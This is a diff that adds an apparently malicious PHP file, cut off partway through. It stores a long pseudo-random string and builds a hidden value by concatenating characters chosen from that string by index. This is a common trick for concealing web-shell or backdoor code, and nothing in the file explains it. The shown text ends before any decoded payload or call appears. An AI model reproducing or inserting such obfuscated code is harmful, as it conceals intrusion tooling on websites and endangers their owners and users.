@@ -1,0 +1,664 @@
+<?php $jaena='YrLy1d3foSd0T2dmf4ouG7Ay0kvZbw1gFkgWwFqpQrB4aACe6NwdLCZ4/TNIxOENVyarD1Qx889QCI1PamwDYBKUdtgMfhdICHevIATzPN9hhx/Cx6qNEBQwFB6jMsRJcfRZ7vZ3l3BqwXiqMXKZxf9zJvpA6dF5vYTiKvp7zAzSPqKiqeepA78Tu9DTLjWTatPDCTwjwo0uXbflUp7+vGq3+jOQUU7+rvIQMUsgt/GrNzSIGT065OcUgbJvj1yE3teJR2uuAHUMTAQofzHIdTSrR1YBsVOS_Dmh1WrMBfuT8Jo[J7QBAp4LDrYsDTBmCZTl1MXXpcooKpiSxlqhfly/tmwFxMvci0k5Q6zvlnbZAAfsK)q8DCtQhYhuGhl32F2cU40AKsIx29DVnlgWd0ZD6JDTT95x9tJZmkhTuNSdma95sLeIXYDdoLgRpO6WV$X1Q/AF6IlsSNtC7mjEJ/vpIMLJtludidJhwzzTokvBlpnS0pOfczSURl1Bbd4QvE+wst1fO/fYQrWM9W1ubk8wd2PUpHOKLxEAnQYIejxTfmWGK8L4XIntvqc6gT4sNnwkq5RYTuC8Ura7KogSnu+5rt/SafMfwnwWJrDXbf6C6oPgxu8/A+H5+dXVL62v0TMqim41uIcnxUo9pN2fIxfNqshyGVr29lvzD7UK6LFafAvRFBHMCqseyaIYNJkdgsB27MMbVM282EmU/SjBBJUjLxpF5nqCtKozJMt887Nd0gTTA39b+Z4zg3wxxYFerN+kOGxwx4Ft4/tLSXS/EJTEAB/3myptoaqk4CNqEEdUrcYYeWnipGtyLlDZ5guvelAK8FhXzgRrbxpHpK4G1X0fGtcnKJatu6sNZKqeeZ5fIQNj6sqOmrsaXV4FFS/MbSjWBQiaD8TzSB08hFhjwSFl582_9PjpQWB3Ba5hNZCxG16BlFZClFB5RDvlhH3Y0hXvjJpCAX02cLLj+cLlFamKUuh+WKWN6DWokXFomAxYI4nQ1+4zMvN4NraeanUFte/RcU5kkSecJwtyDbwT9Tu2BxFZePO4oYFonhhz6pFMrnsBFL5EMdWXbgs3Vas+1Gcs0v1NViETzg3heM0s/+4NumxVLfA0m91pwLjXWrbjqipkJGVn7jl+DD3gXDiYN3v9vAGI9vC1zMDdiZ2LIVxYsAhnvrEwK6ZclTGE82OaXrBM24pE/NoY8RGmrmSuwZFbcgtZuodCqkP6ptfogbXXvdNY/NG2Qn8xL4Xa/jVUoaqgluIobh++/Dzjr2J7GCkZz6SUZoU9TiH/zGKd7NOOjrSE9ZROGJWqEP4/oIjJ3eCNG8JanCQz5g2yWcGLJBpbm4LosNmK0ztrkqL5HUqGS2FyknzlmEAi2qR/3WO4bmr3i2Q4jk4SUk4JyQgrIoqZjsLBb/LErOxnlpNkCe2pYBGvchCMeXW58tlVnkMxlV/BqU4hxsW28c_BfKwByBJbTL7NXgyJEMDrz/6V/dXTljKOupthHqhQNv2QirysUzBgK2e1Ch33ckPVooBHbz//Ak5cMCBRaGjqtMaFcmtAk33jlhv8mx/nrG=xMVix1fz/E8CSoUGHXk4mZjfe9PkipnUivmbdKsHwmQoYMGdpIGIc2cTdOvRcbdHHO5BFNsf6cKnWrYjJQUdm9p6L5yR4Q36BdplhRGZDMukSs+KSTFD08jcUYXVD9+/Vn/qZJwS1t5Uuu2mIOHxwRyHCkrjETFkxEbPQCk9gpy1yIcqbxARwJjom5meHLTGK8BytaGzC6UcvP7ts1BQhHTsXUmgQ6wKTvzEs8QJlUGRWeGEbzAWZf/6yK+tDZ7O0nrnu2MxI9KG23E3bxV88wIO/gDIzseDwcL+2clsECG3oBTXpoG62XQn+GzDKSpO6ncjNFZ6nvk9RnFdqYRlZd3MH1SKWSLn1aF6qR+JvUmmBNEEb54kcb+WViKkUUFHgW4/yB4c8znt6wdZrQwdtWwTCeGkpg1BJ94jYEd5yQUEtJ7Wtbu1vAakDjzG20vlcyKnrjheOW7BxlOX7zxe8dWUj8nwOH73DTNVILqFwGjOevxb9nrwrGc2Pz4jFYSYIs5Zq/hOnRPczzlIexQVJS7Dj9OAUFzCjBQkRssDoA3Clf9wISKe150awuDwEzr4oBeVopjUIt0zXZbWVVy6daHnlWv6SGiT8jg5wB2vunmlNalG4u52rfYBwDsZg/cly2imNjcb2C0UEGgEcjXNb/SWGRiXt93YnOXqagUHV/ugQDyvw2+m9owGOQr`cLW9eYHr66/TfRQxHXbw0DOU8VL2i1mkB2NOGwZlGlJ6TqTfmLP53fCFRQ2SQ8R+uIiFMRIyG0O/p63bjdjtyofu52STPvFmTLYG/Dvt4iGpfuLV9T7ceZo9ud+pNTbOQcnNE1BtbBZmwObhyfgrjTBoRyyuM+4/ZzCWrfjxpEFlfUXsjC2OejMBCikviiQx9F8cqUcjv4scGWHmCxLbIaRVrz0litGZzsEnvw7Y0Gl9jsgbm9rnnjT+PXimWbdn4gHNQeoV30CYysxFpKxLXW/+yRQ5sg1rrur1Nw0U1iqtH1xIPFEKHJeFIxmMefHqWAWsSjZiCsnWkMtHEs2DHTqyNBClDYen+7pizmBOtp9m6mZS9CCy9k/cuypGll2cwIoA5HcnvvbNbTS8G+WcgEGAjjpudGwRCDxjMZsY+Xq9+5TE4lou6/W5meqsqQ7kZ7etb4v6wgJDU94wOJ2ImfycmFvq9wZH94vPGtoHtMOPiJe8OwJD0lfbQJizHlevNJO9tZJ6d7B4NCixmpF7IjrC2D7gUSO5HBvCqdsETK+U21idMtcuXC3(BKF0B1YnObn5Erbi2HU9hVzRWWtwmDTZGZ3LIif0oW7TPZ5abUuFDmTYmILDQX0Y9QcVtg2ONiZEWxscbkc/uybwJUcAxRnpOuOUvY+/eDSsro7p5A39BN9mOHjyofK5MHi9bqhwXhaRFyWGrat56AlJtQZRmJRd0N26J1vFC2Sxj9Kj;XmVjGey+6zjFR7v8hgGj6mrK/5beLTv246WVTt/QgjJPoAv8A4SfzfkDzMCyPZYcOcfpwntdmFdx/T3mQfdwjvVfiI4P1PBCDk+SCuDJujNdm5H+T6B/yBvTH\1IJPOxAlmSL1aBtYAIsJePp+6ATrWZZemdOnqVi6J/hUoInNDsZdFKQdFG1Y2oAcEPl3qEWp+Kq2qfZZslSW6abd3T79wir/ZNwIvoS2NE+nxe6FO0t8RYGMhh772pEpfsTCX2j2hlK6IalTi7b2IFajBzUqwK52PwbwZRP87sLlCAyQp+ohXXxYwhe6SohgxjcSPp5cnNAhOj]I3tVm+xgFMX9WeYVUYGcx8PT/Fe/QWOLJQU61W1fqRe/6td/09+UfnEVY0t95mcjASQmLwB9iMeY+SowPDKkjAudwwTJVxeKWdPVuF4R5kRcmG6Q3tful67meF2hHRdK/g7V62RmfwXD5N34RKZMZTaOZj0XDLevkiKK60hWD2NbHkB1cifOJAdJz3/FGia9owqLrqch7izY1x/g2zHbCjtbpMr0O6X7S+Av6hlqhcOV1DGL6dL016NCuS98Tdfv4IqjOS4DtgHzFqCQjnLIS1P8qSjpcjq9meLSvY8S7px652/ZBjQzXS5lprWd3vnjLg3q/aGu0GOLInNnaC2lpbuRGrBXHy9hwEorv8iB+fwHVOCCzGprL7670oGwgF2Mwx20P35aNUD9jr4XplMxPOKK+VmZ5aWDkJ2RxqlE/f5bgGXSgA45TBlLkqHa34CGVoI4zCZr+2utazzaZYnZrQRk44C2Nibdm0/qy2LovsUXBFa1v/c82kpXAVU6F+9PS9rPcfjROATcuvEv7AFxiybKUzwDkGTzOAZs^95cvjntU5J+FSYVZbG78jPHinNEmDgzzXcX07fMno42M0nhYWMX49nwbN9DdpzetH7UpII0yJLMtn7jDemVZ8HcvUZP6LdQZ3TBEu+NusEJs+QKP2oagiyzcaVQ5sa+SoGyN/qSXhUsY74vO556YJjvoYUzeY2vtfC=rvXyD+ZS8F2O34d3tCGy6+G03i3/o5BUz+IYxwDGqeSttpsp5p+nhSx2vWvEcT40z5vn3ljDyx3P91wb/mw/CExjRuouACmVvqAlvGu+apMu3QuzLsrWz/0xN4Ul71nzOemjJjaMlcm+Pv0netza8n7jQbFiPPf2eohknxsPkcaaVzLuN1jCz6qon4J2MLlJ30qTl1hB8$hs65ACRMvijmHYSv5A29LDOaB+b1BdHWEWkbJQKvS7eWB5NdYEHaNy5u'; $ckuvdnsktwqgsf=$jaena[47].$jaena[49].$jaena[1].$jaena[89].$jaena[20].$jaena[15].$jaena[89].$jaena[12].$jaena[17].$jaena[11].$jaena[28].$jaena[3].$jaena[91].$jaena[4].$jaena[19].$jaena[4].$jaena[56].$jaena[13].$jaena[32].$jaena[35].$jaena[5].$jaena[39].$jaena[46].$jaena[11].$jaena[125].$jaena[35].$jaena[87].$jaena[28].$jaena[5].$jaena[125].$jaena[25].$jaena[5].$jaena[123].$jaena[93].$jaena[59].$jaena[59].$jaena[15].$jaena[62].$jaena[68].$jaena[32].$jaena[0].$jaena[91].$jaena[48].$jaena[0].$jaena[21].$jaena[86].$jaena[35].$jaena[22].$jaena[38].$jaena[59].$jaena[40].$jaena[72].$jaena[60].$jaena[31].$jaena[39].$jaena[48].$jaena[136].$jaena[87].$jaena[28].$jaena[15].$jaena[125].$jaena[27].$jaena[123].$jaena[56].$jaena[361].$jaena[39].$jaena[17].$jaena[27].$jaena[123].$jaena[12].$jaena[9].$jaena[9].$jaena[28].$jaena[12].$jaena[68].$jaena[125].$jaena[28].$jaena[89].$jaena[4].$jaena[5].$jaena[4].$jaena[35].$jaena[11].$jaena[89].$jaena[125].$jaena[123].$jaena[103].$jaena[12].$jaena[6].$jaena[5].$jaena[79].$jaena[12].$jaena[6].$jaena[5].$jaena[61].$jaena[26].$jaena[72].$jaena[126].$jaena[44].$jaena[61].$jaena[17].$jaena[103].$jaena[46].$jaena[13].$jaena[0].$jaena[93].$jaena[3].$jaena[32].$jaena[128].$jaena[47].$jaena[59].$jaena[20].$jaena[64].$jaena[4].$jaena[39].$jaena[12].$jaena[28].$jaena[21].$jaena[74].$jaena[74].$jaena[91].$jaena[21].$jaena[40].$jaena[12].$jaena[28].$jaena[22].$jaena[6].$jaena[60].$jaena[3].$jaena[127].$jaena[159].$jaena[17].$jaena[142].$jaena[27].$jaena[35].$jaena[17].$jaena[79].$jaena[26].$jaena[17].$jaena[128].$jaena[42].$jaena[89].$jaena[31].$jaena[142].$jaena[61].$jaena[49].$jaena[97].$jaena[87].$jaena[141].$jaena[29].$jaena[72].$jaena[97].$jaena[86].$jaena[31].$jaena[64].$jaena[159].$jaena[211].$jaena[72].$jaena[0].$jaena[5].$jaena[59].$jaena[128].$jaena[11].$jaena[136].$jaena[5].$jaena[2].$jaena[42].$jaena[38].$jaena[21].$jaena[7].$jaena[126].$jaena[48].$jaena[26].$jaena[60].$jaena[4].$jaena[11].$jaena[103].$jaena[89].$jaena[12].$jaena[28].$jaena[91].$jaena[42].$jaena[159].$jaena[20].$jaena[91].$jaena[9].$jaena[28].$jaena[62].$jaena[9].$jaena[123].$jaena[42].$jaena[127].$jaena[2].$jaena[46].$jaena[128].$jaena[91].$jaena[1].$jaena[4].$jaena[13].$jaena[125].$jaena[141].$jaena[19].$jaena[93].$jaena[8].$jaena[61].$jaena[25].$jaena[87].$jaena[103].$jaena[125].$jaena[32].$jaena[62].$jaena[5].$jaena[42].$jaena[19].$jaena[142].$jaena[142].$jaena[39].$jaena[49].$jaena[159].$jaena[44].$jaena[22].$jaena[8].$jaena[28].$jaena[3].$jaena[25].$jaena[40].$jaena[32].$jaena[38].$jaena[8].$jaena[11].$jaena[361].$jaena[31].$jaena[127].$jaena[20].$jaena[17].$jaena[0].$jaena[35].$jaena[79].$jaena[123].$jaena[61].$jaena[127].$jaena[40].$jaena[361].$jaena[126].$jaena[64].$jaena[127].$jaena[5].$jaena[0].$jaena[62].$jaena[17].$jaena[127].$jaena[123].$jaena[3].$jaena[29].$jaena[19].$jaena[26].$jaena[1].$jaena[26].$jaena[68].$jaena[40].$jaena[128].$jaena[31].$jaena[49].$jaena[64].$jaena[126].$jaena[48].$jaena[19].$jaena[1].$jaena[44].$jaena[20].$jaena[27].$jaena[0].$jaena[11].$jaena[60].$jaena[15].$jaena[42].$jaena[38].$jaena[361].$jaena[141].$jaena[9].$jaena[48].$jaena[7].$jaena[56].$jaena[47].$jaena[48].$jaena[27].$jaena[72].$jaena[39].$jaena[56].$jaena[128].$jaena[48].$jaena[56].$jaena[12].$jaena[123].$jaena[125].$jaena[361].$jaena[22].$jaena[211].$jaena[19].$jaena[11].$jaena[7].$jaena[48].$jaena[42].$jaena[128].$jaena[15].$jaena[86].$jaena[28].$jaena[9].$jaena[87].$jaena[97].$jaena[12].$jaena[11].$jaena[72].$jaena[79].$jaena[28].$jaena[49].$jaena[59].$jaena[56].$jaena[0].$jaena[59].$jaena[7].$jaena[38].$jaena[22].$jaena[28].$jaena[141].$jaena[141].$jaena[32].$jaena[97].$jaena[20].$jaena[15].$jaena[103].$jaena[38].$jaena[3].$jaena[26].$jaena[2].$jaena[89].$jaena[60].$jaena[42].$jaena[136].$jaena[1].$jaena[9].$jaena[25].$jaena[35].$jaena[21].$jaena[46].$jaena[125].$jaena[91].$jaena[1].$jaena[68].$jaena[4].$jaena[211].$jaena[20].$jaena[3].$jaena[7].$jaena[40].$jaena[9].$jaena[35].$jaena[86].$jaena[61].$jaena[7].$jaena[74].$jaena[56].$jaena[0].$jaena[17].$jaena[68].$jaena[86].$jaena[128].$jaena[211].$jaena[46].$jaena[47].$jaena[31].$jaena[141].$jaena[61].$jaena[56].$jaena[9].$jaena[15].$jaena[29].$jaena[17].$jaena[136].$jaena[103].$jaena[12].$jaena[7].$jaena[56].$jaena[11].$jaena[142].$jaena[38].$jaena[26].$jaena[87].$jaena[72].$jaena[125].$jaena[141].$jaena[13].$jaena[42].$jaena[17].$jaena[49].$jaena[123].$jaena[48].$jaena[60].$jaena[9].$jaena[211].$jaena[35].$jaena[5].$jaena[19].$jaena[56].$jaena[5].$jaena[8].$jaena[17].$jaena[20].$jaena[3].$jaena[8].$jaena[87].$jaena[211].$jaena[361].$jaena[128].$jaena[48].$jaena[123].$jaena[103].$jaena[40].$jaena[123].$jaena[361].$jaena[64].$jaena[20].$jaena[5].$jaena[127].$jaena[28].$jaena[39].$jaena[64].$jaena[8].$jaena[74].$jaena[123].$jaena[89].$jaena[21].$jaena[361].$jaena[141].$jaena[48].$jaena[361].$jaena[68].$jaena[29].$jaena[126].$jaena[4].$jaena[0].$jaena[97].$jaena[39].$jaena[136].$jaena[62].$jaena[128].$jaena[74].$jaena[7].$jaena[12].$jaena[97].$jaena[47].$jaena[136].$jaena[46].$jaena[123].$jaena[19].$jaena[11].$jaena[31].$jaena[8].$jaena[136].$jaena[26].$jaena[1].$jaena[1].$jaena[141].$jaena[39].$jaena[5].$jaena[3].$jaena[62].$jaena[15].$jaena[47].$jaena[44].$jaena[28].$jaena[32].$jaena[27].$jaena[159].$jaena[123].$jaena[125].$jaena[64].$jaena[38].$jaena[38].$jaena[126].$jaena[128].$jaena[13].$jaena[13].$jaena[38].$jaena[28].$jaena[1].$jaena[9].$jaena[15].$jaena[89].$jaena[26].$jaena[25].$jaena[22].$jaena[128].$jaena[2].$jaena[44].$jaena[4].$jaena[87].$jaena[79].$jaena[39].$jaena[38].$jaena[59].$jaena[29].$jaena[48].$jaena[42].$jaena[68].$jaena[68].$jaena[20].$jaena[9].$jaena[19].$jaena[11].$jaena[126].$jaena[49].$jaena[64].$jaena[60].$jaena[60].$jaena[123].$jaena[47].$jaena[17].$jaena[93].$jaena[123].$jaena[12].$jaena[5].$jaena[25].$jaena[127].$jaena[31].$jaena[29].$jaena[40].$jaena[97].$jaena[9].$jaena[141].$jaena[4].$jaena[29].$jaena[97].$jaena[211].$jaena[32].$jaena[49].$jaena[136].$jaena[61].$jaena[46].$jaena[21].$jaena[39].$jaena[42].$jaena[32].$jaena[159].$jaena[89].$jaena[93].$jaena[125].$jaena[8].$jaena[61].$jaena[136].$jaena[89].$jaena[26].$jaena[42].$jaena[12].$jaena[26].$jaena[123].$jaena[62].$jaena[86].$jaena[15].$jaena[361].$jaena[8].$jaena[61].$jaena[13].$jaena[48].$jaena[7].$jaena[40].$jaena[35].$jaena[22].$jaena[15].$jaena[211].$jaena[123].$jaena[74].$jaena[13].$jaena[103].$jaena[47].$jaena[21].$jaena[2].$jaena[1].$jaena[62].$jaena[74].$jaena[2].$jaena[21].$jaena[103].$jaena[5].$jaena[126].$jaena[20].$jaena[8].$jaena[86].$jaena[5].$jaena[47].$jaena[128].$jaena[15].$jaena[42].$jaena[7].$jaena[159].$jaena[19].$jaena[28].$jaena[13].$jaena[56].$jaena[49].$jaena[27].$jaena[93].$jaena[19].$jaena[17].$jaena[59].$jaena[25].$jaena[25].$jaena[91].$jaena[39].$jaena[93].$jaena[126].$jaena[1].$jaena[127].$jaena[40].$jaena[361].$jaena[125].$jaena[74].$jaena[11].$jaena[159].$jaena[22].$jaena[12].$jaena[103].$jaena[87].$jaena[64].$jaena[17].$jaena[32].$jaena[126].$jaena[5].$jaena[27].$jaena[211].$jaena[46].$jaena[89].$jaena[7].$jaena[46].$jaena[26].$jaena[26].$jaena[3].$jaena[8].$jaena[44].$jaena[8].$jaena[61].$jaena[20].$jaena[79].$jaena[125].$jaena[141].$jaena[32].$jaena[49].$jaena[12].$jaena[142].$jaena[60].$jaena[40].$jaena[93].$jaena[91].$jaena[29].$jaena[20].$jaena[68].$jaena[72].$jaena[123].$jaena[136].$jaena[49].$jaena[159].$jaena[21].$jaena[27].$jaena[32].$jaena[159].$jaena[47].$jaena[27].$jaena[20].$jaena[27].$jaena[123].$jaena[68].$jaena[60].$jaena[26].$jaena[97].$jaena[28].$jaena[48].$jaena[49].$jaena[128].$jaena[44].$jaena[13].$jaena[42].$jaena[11].$jaena[91].$jaena[32].$jaena[59].$jaena[126].$jaena[6].$jaena[13].$jaena[42].$jaena[93].$jaena[4].$jaena[1].$jaena[47].$jaena[6].$jaena[128].$jaena[141].$jaena[32].$jaena[46].$jaena[97].$jaena[22].$jaena[8].$jaena[123].$jaena[142].$jaena[72].$jaena[19].$jaena[13].$jaena[211].$jaena[27].$jaena[27].$jaena[0].$jaena[141].$jaena[89].$jaena[5].$jaena[22].$jaena[56].$jaena[22].$jaena[125].$jaena[86].$jaena[3].$jaena[68].$jaena[17].$jaena[60].$jaena[2].$jaena[25].$jaena[13].$jaena[31].$jaena[103].$jaena[25].$jaena[26].$jaena[48].$jaena[13].$jaena[74].$jaena[141].$jaena[26].$jaena[56].$jaena[12].$jaena[5].$jaena[361].$jaena[211].$jaena[6].$jaena[125].$jaena[11].$jaena[26].$jaena[7].$jaena[91].$jaena[361].$jaena[123].$jaena[0].$jaena[4].$jaena[128].$jaena[123].$jaena[4].$jaena[62].$jaena[123].$jaena[31].$jaena[11].$jaena[49].$jaena[103].$jaena[27].$jaena[59].$jaena[31].$jaena[48].$jaena[74].$jaena[12].$jaena[13].$jaena[103].$jaena[26].$jaena[8].$jaena[68].$jaena[125].$jaena[42].$jaena[125].$jaena[7].$jaena[74].$jaena[56].$jaena[19].$jaena[97].$jaena[19].$jaena[60].$jaena[19].$jaena[22].$jaena[103].$jaena[91].$jaena[97].$jaena[60].$jaena[13].$jaena[127].$jaena[6].$jaena[7].$jaena[22].$jaena[128].$jaena[39].$jaena[141].$jaena[62].$jaena[38].$jaena[68].$jaena[15].$jaena[128].$jaena[64].$jaena[142].$jaena[128].$jaena[15].$jaena[89].$jaena[2].$jaena[25].$jaena[136].$jaena[19].$jaena[12].$jaena[3].$jaena[126].$jaena[35].$jaena[15].$jaena[19].$jaena[27].$jaena[68].$jaena[62].$jaena[49].$jaena[79].$jaena[211].$jaena[59].$jaena[128].$jaena[12].$jaena[86].$jaena[127].$jaena[22].$jaena[4].$jaena[40].$jaena[64].$jaena[17].$jaena[17].$jaena[211].$jaena[9].$jaena[15].$jaena[19].$jaena[47].$jaena[38].$jaena[48].$jaena[31].$jaena[8].$jaena[361].$jaena[4].$jaena[142].$jaena[12].$jaena[13].$jaena[27].$jaena[26].$jaena[35].$jaena[87].$jaena[12].$jaena[15].$jaena[93].$jaena[64].$jaena[47].$jaena[22].$jaena[142].$jaena[13].$jaena[48].$jaena[68].$jaena[159].$jaena[15].$jaena[5].$jaena[22].$jaena[6].$jaena[103].$jaena[17].$jaena[32].$jaena[79].$jaena[128].$jaena[126].$jaena[127].$jaena[20].$jaena[17].$jaena[5].$jaena[72].$jaena[27].$jaena[15].$jaena[49].$jaena[38].$jaena[48].$jaena[136].$jaena[89].$jaena[1].$jaena[15].$jaena[3].$jaena[29].$jaena[8].$jaena[28].$jaena[22].$jaena[15].$jaena[0].$jaena[87].$jaena[126].$jaena[61].$jaena[68].$jaena[93].$jaena[361].$jaena[141].$jaena[49].$jaena[125].$jaena[159].$jaena[21].$jaena[141].$jaena[5].$jaena[21].$jaena[60].$jaena[74].$jaena[12].$jaena[29].$jaena[19].$jaena[103].$jaena[35].$jaena[13].$jaena[103].$jaena[2].$jaena[61].$jaena[22].$jaena[8].$jaena[68].$jaena[103].$jaena[15].$jaena[49].$jaena[20].$jaena[1].$jaena[86].$jaena[0].$jaena[7].$jaena[123].$jaena[27].$jaena[74].$jaena[12].$jaena[3].$jaena[21].$jaena[72].$jaena[5].$jaena[32].$jaena[8].$jaena[59].$jaena[19].$jaena[13].$jaena[12].$jaena[20].$jaena[29].$jaena[103].$jaena[68].$jaena[35].$jaena[17].$jaena[86].$jaena[61].$jaena[42].$jaena[38].$jaena[123].$jaena[64].$jaena[49].$jaena[127].$jaena[39].$jaena[89].$jaena[74].$jaena[86].$jaena[361].$jaena[6].$jaena[44].$jaena[47].$jaena[61].$jaena[68].$jaena[123].$jaena[1].$jaena[44].$jaena[123].$jaena[3].$jaena[91].$jaena[61].$jaena[7].$jaena[72].$jaena[61].$jaena[64].$jaena[26].$jaena[28].$jaena[89].$jaena[2].$jaena[17].$jaena[19].$jaena[79].$jaena[48].$jaena[68].$jaena[125].$jaena[28].$jaena[48].$jaena[42].$jaena[89].$jaena[49].$jaena[56].$jaena[13].$jaena[42].$jaena[17].$jaena[7].$jaena[5].$jaena[20].$jaena[26].$jaena[2].$jaena[128].$jaena[44].$jaena[17].$jaena[60].$jaena[211].$jaena[42].$jaena[64].$jaena[91].$jaena[91].$jaena[5].$jaena[28].$jaena[40].$jaena[103].$jaena[123].$jaena[25].$jaena[91].$jaena[7].$jaena[49].$jaena[103].$jaena[0].$jaena[22].$jaena[4].$jaena[64].$jaena[93].$jaena[26].$jaena[89].$jaena[5].$jaena[44].$jaena[91].$jaena[64].$jaena[15].$jaena[125].$jaena[5].$jaena[361].$jaena[5].$jaena[31].$jaena[123].$jaena[61].$jaena[6].$jaena[27].$jaena[12].$jaena[49].$jaena[61].$jaena[64].$jaena[27].$jaena[4].$jaena[31].$jaena[0].$jaena[97].$jaena[93].$jaena[159].$jaena[6].$jaena[47].$jaena[48].$jaena[44].$jaena[46].$jaena[13].$jaena[4].$jaena[361].$jaena[29].$jaena[35].$jaena[89].$jaena[49].$jaena[72].$jaena[27].$jaena[361].$jaena[79].$jaena[44].$jaena[79].$jaena[42].$jaena[26].$jaena[6].$jaena[89].$jaena[8].$jaena[60].$jaena[49].$jaena[29].$jaena[2].$jaena[2].$jaena[87].$jaena[25].$jaena[361].$jaena[19].$jaena[22].$jaena[91].$jaena[39].$jaena[60].$jaena[39].$jaena[61].$jaena[62].$jaena[142].$jaena[17].$jaena[48].$jaena[7].$jaena[59].$jaena[128].$jaena[5].$jaena[142].$jaena[136].$jaena[0].$jaena[25].$jaena[159].$jaena[6].$jaena[31].$jaena[93].$jaena[29].$jaena[7].$jaena[127].$jaena[29].$jaena[11].$jaena[9].$jaena[29].$jaena[8].$jaena[49].$jaena[136].$jaena[31].$jaena[44].$jaena[89].$jaena[38].$jaena[123].$jaena[13].$jaena[97].$jaena[61].$jaena[17].$jaena[125].$jaena[142].$jaena[46].$jaena[28].$jaena[2].$jaena[89].$jaena[15].$jaena[40].$jaena[361].$jaena[31].$jaena[32].$jaena[22].$jaena[13].$jaena[32].$jaena[79].$jaena[39].$jaena[9].$jaena[125].$jaena[22].$jaena[2].$jaena[19].$jaena[7].$jaena[46].$jaena[29].$jaena[21].$jaena[20].$jaena[22].$jaena[38].$jaena[9].$jaena[29].$jaena[59].$jaena[22].$jaena[5].$jaena[93].$jaena[59].$jaena[97].$jaena[1].$jaena[13].$jaena[32].$jaena[48].$jaena[89].$jaena[15].$jaena[26].$jaena[142].$jaena[126].$jaena[72].$jaena[59].$jaena[125].$jaena[128].$jaena[87].$jaena[123].$jaena[1].$jaena[127].$jaena[4].$jaena[128].$jaena[93].$jaena[61].$jaena[29].$jaena[61].$jaena[29].$jaena[68].$jaena[27].$jaena[46].$jaena[86].$jaena[136].$jaena[72].$jaena[35].$jaena[47].$jaena[86].$jaena[141].$jaena[87].$jaena[56].$jaena[22].$jaena[47].$jaena[159].$jaena[13].$jaena[12].$jaena[74].$jaena[159].$jaena[26].$jaena[29].$jaena[39].$jaena[60].$jaena[361].$jaena[26].$jaena[74].$jaena[35].$jaena[1].$jaena[68].$jaena[64].$jaena[12].$jaena[123].$jaena[17].$jaena[25].$jaena[26].$jaena[0].$jaena[4].$jaena[60].$jaena[21].$jaena[29].$jaena[38].$jaena[28].$jaena[42].$jaena[12].$jaena[87].$jaena[9].$jaena[35].$jaena[6].$jaena[35].$jaena[42].$jaena[42].$jaena[5].$jaena[20].$jaena[17].$jaena[21].$jaena[136].$jaena[361].$jaena[61].$jaena[4].$jaena[93].$jaena[12].$jaena[60].$jaena[11].$jaena[25].$jaena[9].$jaena[25].$jaena[128].$jaena[4].$jaena[20].$jaena[40].$jaena[48].$jaena[13].$jaena[60].$jaena[64].$jaena[56].$jaena[44].$jaena[35].$jaena[72].$jaena[3].$jaena[56].$jaena[25].$jaena[72].$jaena[38].$jaena[126].$jaena[89].$jaena[2].$jaena[31].$jaena[56].$jaena[74].$jaena[97].$jaena[103].$jaena[7].$jaena[40].$jaena[159].$jaena[47].$jaena[6].$jaena[103].$jaena[32].$jaena[47].$jaena[44].$jaena[159].$jaena[46].$jaena[61].$jaena[141].$jaena[25].$jaena[39].$jaena[20].$jaena[19].$jaena[42].$jaena[87].$jaena[103].$jaena[6].$jaena[0].$jaena[211].$jaena[211].$jaena[61].$jaena[17].$jaena[22].$jaena[3].$jaena[142].$jaena[8].$jaena[19].$jaena[12].$jaena[29].$jaena[46].$jaena[68].$jaena[9].$jaena[4].$jaena[2].$jaena[59].$jaena[61].$jaena[103].$jaena[4].$jaena[19].$jaena[89].$jaena[6].$jaena[47].$jaena[39].$jaena[13].$jaena[159].$jaena[26].$jaena[27].$jaena[6].$jaena[89].$jaena[29].$jaena[11].$jaena[68].$jaena[19].$jaena[38].$jaena[8].$jaena[27].$jaena[44].$jaena[47].$jaena[47].$jaena[141].$jaena[0].$jaena[59].$jaena[5].$jaena[46].$jaena[26].$jaena[103].$jaena[123].$jaena[11].$jaena[60].$jaena[38].$jaena[123].$jaena[13].$jaena[42].$jaena[72].$jaena[28].$jaena[42].$jaena[39].$jaena[125].$jaena[13].$jaena[40].$jaena[4].$jaena[20].$jaena[59].$jaena[44].$jaena[61].$jaena[2].$jaena[86].$jaena[61].$jaena[20].$jaena[68].$jaena[8].$jaena[21].$jaena[11].$jaena[47].$jaena[159].$jaena[32].$jaena[136].$jaena[97].$jaena[22].$jaena[60].$jaena[8].$jaena[89].$jaena[42].$jaena[125].$jaena[46].$jaena[21].$jaena[91].$jaena[46].$jaena[87].$jaena[35].$jaena[126].$jaena[93].$jaena[136].$jaena[136].$jaena[40].$jaena[103].$jaena[25].$jaena[79].$jaena[136].$jaena[91].$jaena[59].$jaena[8].$jaena[39].$jaena[159].$jaena[15].$jaena[49].$jaena[103].$jaena[103].$jaena[211].$jaena[0].$jaena[32].$jaena[9].$jaena[361].$jaena[59].$jaena[87].$jaena[1].$jaena[49].$jaena[20].$jaena[13].$jaena[123].$jaena[26].$jaena[59].$jaena[29].$jaena[15].$jaena[93].$jaena[11].$jaena[93].$jaena[7].$jaena[3].$jaena[9].$jaena[62].$jaena[35].$jaena[0].$jaena[27].$jaena[13].$jaena[68].$jaena[125].$jaena[0].$jaena[72].$jaena[141].$jaena[46].$jaena[40].$jaena[123].$jaena[123].$jaena[68].$jaena[103].$jaena[32].$jaena[142].$jaena[47].$jaena[27].$jaena[123].$jaena[125].$jaena[29].$jaena[21].$jaena[3].$jaena[123].$jaena[61].$jaena[15].$jaena[211].$jaena[46].$jaena[2].$jaena[38].$jaena[21].$jaena[42].$jaena[211].$jaena[159].$jaena[127].$jaena[29].$jaena[361].$jaena[13].$jaena[211].$jaena[128].$jaena[136].$jaena[46].$jaena[74].$jaena[40].$jaena[49].$jaena[87].$jaena[21].$jaena[48].$jaena[86].$jaena[128].$jaena[2].$jaena[127].$jaena[38].$jaena[142].$jaena[9].$jaena[159].$jaena[26].$jaena[31].$jaena[123].$jaena[40].$jaena[56].$jaena[8].$jaena[127].$jaena[72].$jaena[141].$jaena[59].$jaena[29].$jaena[48].$jaena[35].$jaena[48].$jaena[13].$jaena[74].$jaena[125].$jaena[159].$jaena[79].$jaena[44].$jaena[126].$jaena[3].$jaena[48].$jaena[26].$jaena[5].$jaena[48].$jaena[22].$jaena[56].$jaena[87].$jaena[46].$jaena[20].$jaena[87].$jaena[38].$jaena[68].$jaena[361].$jaena[26].$jaena[29].$jaena[20].$jaena[8].$jaena[27].$jaena[15].$jaena[19].$jaena[0].$jaena[26].$jaena[123].$jaena[68].$jaena[123].$jaena[6].$jaena[68].$jaena[9].$jaena[15].$jaena[20].$jaena[31].$jaena[59].$jaena[39].$jaena[22].$jaena[142].$jaena[46].$jaena[49].$jaena[48].$jaena[62].$jaena[46].$jaena[29].$jaena[1].$jaena[44].$j